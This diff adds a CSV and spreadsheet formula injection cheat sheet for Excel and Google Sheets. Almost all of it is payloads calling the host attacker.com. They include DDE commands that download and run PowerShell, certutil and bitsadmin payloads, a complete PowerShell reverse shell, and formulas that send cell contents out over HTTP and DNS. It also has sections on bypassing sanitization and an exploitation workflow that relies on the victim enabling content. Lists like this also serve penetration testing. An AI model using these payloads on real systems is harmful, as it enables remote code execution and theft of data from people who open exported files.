@@ -1,0 +1,292 @@
+# CSV Injection Payloads
+
+## ========================================
+## BASIC CSV INJECTION
+## ========================================
+
+# Formula injection
+=1+1
+=1+2
+=A1+B1
+
+# Command execution (Excel)
+=cmd|'/c calc'!A1
+=cmd|'/c powershell IEX(wget attacker.com/shell.ps1)'!A1
+
+# DDE (Dynamic Data Exchange)
+=cmd|'/c calc'!A1
+@SUM(1+1)*cmd|'/c calc'!A1
+
+## ========================================
+## EXCEL FORMULA INJECTION
+## ========================================
+
+# Basic formulas
+=1+1
+=SUM(A1:A10)
+=AVERAGE(A1:A10)
+
+# Command execution
+=cmd|' /C calc'!A0
+=cmd|' /C powershell IEX(wget http://attacker.com/shell.ps1)'!A0
+
+# URL redirection
+=HYPERLINK("http://attacker.com","Click")
+=HYPERLINK("http://attacker.com?c="&A1,"Click")
+
+## ========================================
+## GOOGLE SHEETS INJECTION
+## ========================================
+
+# IMPORTXML
+=IMPORTXML("http://attacker.com/xxe.xml","//root")
+=IMPORTXML(CONCAT("http://attacker.com/?",A1),"//root")
+
+# IMPORTFEED
+=IMPORTFEED("http://attacker.com/feed.xml")
+
+# IMPORTHTML
+=IMPORTHTML("http://attacker.com","table",1)
+
+# IMPORTDATA
+=IMPORTDATA("http://attacker.com/data.csv")
+
+## ========================================
+## DDE (DYNAMIC DATA EXCHANGE)
+## ========================================
+
+# Windows calculator
+=cmd|'/c calc'!A1
+@SUM(1+1)*cmd|'/c calc'!A1
+
+# PowerShell execution
+=cmd|'/c powershell -w hidden -c IEX(wget http://attacker.com/s.ps1)'!A1
+
+# Command shell
+=cmd|'/c cmd'!A1
+
+## ========================================
+## DATA EXFILTRATION
+## ========================================
+
+# Send data to attacker
+=HYPERLINK("http://attacker.com/?data="&A1&B1&C1,".")
+=IMPORTXML("http://attacker.com/?data="&A1,"//root")
+
+# Exfiltrate cell contents
+=IMPORTXML(CONCAT("http://attacker.com/?",A1:Z100),"//root")
+
+## ========================================
+## ENCODING BYPASS
+## ========================================
+
+# Tab character
+\t=1+1
+
+# Carriage return
+\r=1+1
+
+# Newline
+\n=1+1
+
+# Mixed
+\r\n=1+1
+
+## ========================================
+## SPECIAL CHARACTERS
+## ========================================
+
+# All formula indicators
+=formula
++formula
+-formula
+@formula
+
+# Excel specific
+=1+1
++1+1
+-1+1
+@SUM(1+1)
+
+## ========================================
+## PROTECTION BYPASS
+## ========================================
+
+# Character encoding
+%3D1+1 (URL encoded =)
+&#61;1+1 (HTML entity)
+
+# Tab/space prefixes
+\t=1+1
+ =1+1
+
+# Mixed case
+=SuM(1+1)
+=HyPeRlInK("http://attacker.com")
+
+## ========================================
+## REVERSE SHELL PAYLOADS
+## ========================================
+
+# Windows - PowerShell reverse shell
+=cmd|'/c powershell -w hidden -c $client=New-Object System.Net.Sockets.TCPClient("attacker.com",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'!A1
+
+# Certutil download and execute
+=cmd|'/c certutil -urlcache -split -f http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe && C:\\Windows\\Temp\\payload.exe'!A1
+
+## ========================================
+## LOCAL FILE ACCESS
+## ========================================
+
+# Read local files (Excel)
+=WEBSERVICE("file:///c:/windows/win.ini")
+
+# Data exfiltration via DNS
+=WEBSERVICE("http://"&A1&".attacker.com")
+
+## ========================================
+## COMMON INJECTION POINTS
+## ========================================
+
+# User input fields
+Name: =1+1
+Email: =cmd|'/c calc'!A1
+Address: @SUM(1+1)
+
+# Export functionality
+CSV export with user data
+Excel export with formulas
+
+# Report generation
+Custom reports
+Data downloads
+
+## ========================================
+## GOOGLE SHEETS SPECIFIC
+## ========================================
+
+# IMAGE function
+=IMAGE("http://attacker.com/log?data="&A1)
+
+# IMPORTRANGE
+=IMPORTRANGE("spreadsheet_url","Sheet1!A1:Z100")
+
+# QUERY
+=QUERY(IMPORTDATA("http://attacker.com/data"),"SELECT *")
+
+## ========================================
+## PAYLOAD VARIATIONS
+## ========================================
+
+# Calculator (Windows)
+=cmd|'/c calc'!A1
+@SUM(1+1)*cmd|'/c calc'!A1
++cmd|'/c calc'!A1
+-cmd|'/c calc'!A1
+
+# Notepad
+=cmd|'/c notepad'!A1
+
+# Browse to URL
+=HYPERLINK("http://attacker.com","Click")
+
+## ========================================
+## ADVANCED EXPLOITATION
+## ========================================
+
+# Multi-stage payload
+=cmd|'/c bitsadmin /transfer job http://attacker.com/stage2.bat %TEMP%\\s.bat && %TEMP%\\s.bat'!A1
+
+# Download and execute
+=cmd|'/c powershell (New-Object Net.WebClient).DownloadFile(\"http://attacker.com/payload.exe\",\"payload.exe\");Start-Process \"payload.exe\"'!A1
+
+## ========================================
+## CSV INJECTION DETECTION
+## ========================================
+
+# Formulas starting with:
+=
++
+-
+@
+
+# DDE patterns:
+cmd|
+@SUM
+=cmd
+
+# URL patterns:
+HYPERLINK
+IMPORTXML
+WEBSERVICE
+
+## ========================================
+## EXPLOITATION WORKFLOW
+## ========================================
+
+# 1. Inject formula in input field
+Name: =1+1
+
+# 2. Trigger export to CSV/Excel
+Download data as CSV
+
+# 3. User opens file
+Excel displays security warning
+
+# 4. User clicks "Enable Content"
+Formula executes
+
+# 5. Payload runs
+Command execution/Data exfiltration
+
+## ========================================
+## SANITIZATION BYPASS
+## ========================================
+
+# If '=' is blocked
++=1+1
+-=1+1
+@=1+1
+
+# If formula keywords blocked
+=C&"O"&"N"&"C"&"A"&"T"("http://","attacker.com")
+
+# Character encoding
+=CHAR(99)&CHAR(109)&CHAR(100)
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Input formula in field
+# 2. Export data to CSV
+# 3. Open in Excel/Sheets
+# 4. Check if formula executes
+# 5. Verify command execution
+
+## ========================================
+## REAL-WORLD EXAMPLES
+## ========================================
+
+# Username field
+=cmd|'/c calc'!A1
+
+# Comment field
+=HYPERLINK("http://attacker.com/?cookie="&DOCUMENT.COOKIE,"Click")
+
+# Address field
+@SUM(1+1)*cmd|'/c powershell IEX(wget http://attacker.com/s.ps1)'!A1
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Input payloads in web forms
+Export and open in Excel/Sheets
+
+# Burp Suite
+Test formula injection in requests
+
+# CSV injection tester
+Automated payload insertion
